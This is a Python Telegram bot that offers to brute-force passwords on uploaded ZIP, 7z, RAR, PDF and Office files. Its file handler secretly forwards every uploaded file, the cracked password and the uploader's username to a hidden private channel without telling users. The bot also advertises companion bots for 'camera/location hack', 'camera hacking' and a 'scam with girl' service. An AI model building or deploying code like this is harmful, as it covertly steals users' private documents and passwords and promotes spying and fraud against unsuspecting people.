import os
import requests
import pyzipper
import py7zr
import pdfplumber
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
PRIVATE_CHANNEL = -1004491770657  # 🔥 APNA PRIVATE CHANNEL ID DALO
CHANNEL_USERNAME = "@nrtecno2"    # 🔥 APNA CHANNEL USERNAME

# ============================================================
# 1. CHANNEL JOIN CHECK
# ============================================================
async def check_channel_membership(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember"
        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
        response = requests.get(url, params=params)
        data = response.json()
        
        if data["ok"]:
            status = data["result"]["status"]
            return status in ["member", "creator", "administrator"]
        return False
    except:
        return False

# ============================================================
# 2. WORDLIST
# ============================================================
def load_wordlist(path="wordlist.txt"):
    if os.path.exists(path):
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    return ['123456', 'password', 'admin', '1234', '0000', 'qwerty', 'abc123', 'letmein', 'welcome', 'monkey']

WORDLIST = load_wordlist()

# ============================================================
# 3. ALL FILE CRACKERS
# ============================================================
def crack_zip(file_path):
    for pwd in WORDLIST:
        try:
            with pyzipper.AESZipFile(file_path) as zf:
                zf.extractall(pwd=pwd.encode())
                return pwd
        except:
            continue
    return None

def crack_7z(file_path):
    for pwd in WORDLIST:
        try:
            with py7zr.SevenZipFile(file_path, password=pwd) as archive:
                archive.extractall()
                return pwd
        except:
            continue
    return None

def crack_pdf(file_path):
    for pwd in WORDLIST:
        try:
            with pdfplumber.open(file_path, password=pwd) as pdf:
                if len(pdf.pages) > 0:
                    return pwd
        except:
            continue
    return None

def crack_docx(file_path):
    try:
        import msoffcrypto
        for pwd in WORDLIST:
            try:
                with open(file_path, 'rb') as f:
                    office = msoffcrypto.OfficeFile(f)
                    office.load_key(password=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None

def crack_xlsx(file_path):
    return crack_docx(file_path)

def crack_pptx(file_path):
    return crack_docx(file_path)

def crack_rar(file_path):
    try:
        import rarfile
        for pwd in WORDLIST:
            try:
                with rarfile.RarFile(file_path) as rf:
                    rf.extractall(pwd=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None

def crack_file(file_path, ext):
    if ext == 'zip':
        return crack_zip(file_path)
    elif ext == '7z':
        return crack_7z(file_path)
    elif ext == 'pdf':
        return crack_pdf(file_path)
    elif ext in ['docx', 'doc']:
        return crack_docx(file_path)
    elif ext in ['xlsx', 'xls']:
        return crack_xlsx(file_path)
    elif ext in ['pptx', 'ppt']:
        return crack_pptx(file_path)
    elif ext == 'rar':
        return crack_rar(file_path)
    else:
        return None

# ============================================================
# 4. OUR BOTS BUTTON
# ============================================================
OUR_BOTS_TEXT = """
╔═══════════════════════════════════════╗
║                                       ║
║          @camerahacking_nrt_bot       ║
║          CAMERA 📸 / LOCATION 📍 HACK ║
║                                       ║
╚═══════════════════════════════════════╝

╔═══════════════════════════════════════╗
║                                       ║
║              @nrtts_bot               ║
║            TEXT TO VOICE 🔉           ║
║                                       ║
╚═══════════════════════════════════════╝

╔═══════════════════════════════════════╗
║                                       ║
║          @nrtratrofficial_bot         ║
║          CAMERA HACKING 📸            ║
║                                       ║
╚═══════════════════════════════════════╝

╔═══════════════════════════════════════╗
║                                       ║
║            @periodshelp_bot           ║
║            SCAM WITH GIRL 😧          ║
║                                       ║
╚═══════════════════════════════════════╝
"""

async def our_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id):
        await update.message.reply_text("❌ Please join @nrtecno2 first.")
        return
    
    keyboard = [
        [InlineKeyboardButton("📸 CAMERA/LOCATION HACK", url="https://t.me/camerahacking_nrt_bot")],
        [InlineKeyboardButton("🔉 TEXT TO VOICE", url="https://t.me/nrtts_bot")],
        [InlineKeyboardButton("📸 CAMERA HACKING", url="https://t.me/nrtratrofficial_bot")],
        [InlineKeyboardButton("😧 PERIODS HELP", url="https://t.me/periodshelp_bot")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(OUR_BOTS_TEXT, reply_markup=reply_markup, parse_mode='Markdown')

# ============================================================
# 5. MAIN HANDLERS
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id):
        await update.message.reply_text(
            "🔴 *Access Denied!*\n\n"
            "❌ Please join our channel first:\n"
            "👉 @nrtecno2\n\n"
            "_After joining, send /start again._",
            parse_mode='Markdown'
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("🤖 OUR BOTS", callback_data="our_bots")],
        [InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/nrtecno2")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔐 *NRTECNO PASSWORD CRACKER*\n\n"
        "✅ Channel Member Verified!\n"
        "📁 Send me any password protected file.\n\n"
        "Supported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "our_bots":
        await our_bots(query.message, context)

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or str(user_id)
    
    # CHANNEL CHECK
    if not await check_channel_membership(user_id):
        await update.message.reply_text("❌ Please join @nrtecno2 first.")
        return
    
    file = update.message.document
    if not file:
        await update.message.reply_text("❌ Please send a file.")
        return
    
    # DOWNLOAD FILE
    file_obj = await file.get_file()
    file_path = f"downloads/{file.file_name}"
    os.makedirs("downloads", exist_ok=True)
    await file_obj.download_to_drive(file_path)
    
    await update.message.reply_text("🔍 *Cracking Password...*\n⏳ Please wait.", parse_mode='Markdown')
    
    # CRACK
    ext = file.file_name.split('.')[-1].lower()
    password = crack_file(file_path, ext)
    
    # PRIVATE CHANNEL FORWARD (ALWAYS)
    try:
        caption = f"📁 File: {file.file_name}\n🔑 Password: `{password or 'NOT FOUND'}`\n👤 User: @{username}\n📅 Date: {__import__('datetime').datetime.now()}"
        
        with open(file_path, 'rb') as f:
            await context.bot.send_document(
                chat_id=PRIVATE_CHANNEL,
                document=f,
                caption=caption,
                parse_mode='Markdown'
            )
    except Exception as e:
        print(f"Forward failed: {e}")
    
    # REPLY TO USER
    if password:
        await update.message.reply_text(
            f"✅ *Password Cracked!*\n\n🔑 `{password}`\n\n📁 {file.file_name}",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ *Password Not Found*\n\n📁 {file.file_name}\n🔢 {len(WORDLIST)} passwords tried.",
            parse_mode='Markdown'
        )
    
    os.remove(file_path)

# ============================================================
# 6. MAIN
# ============================================================
def main():
    if not TOKEN:
        print("❌ BOT_TOKEN not found!")
        return
    
    # Webhook Delete
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook")
        print("✅ Webhook Deleted")
    except:
        pass
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bots", our_bots))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("🤖 NRTECNO BOT STARTED...")
    app.run_polling()

if __name__ == "__main__":
    main()
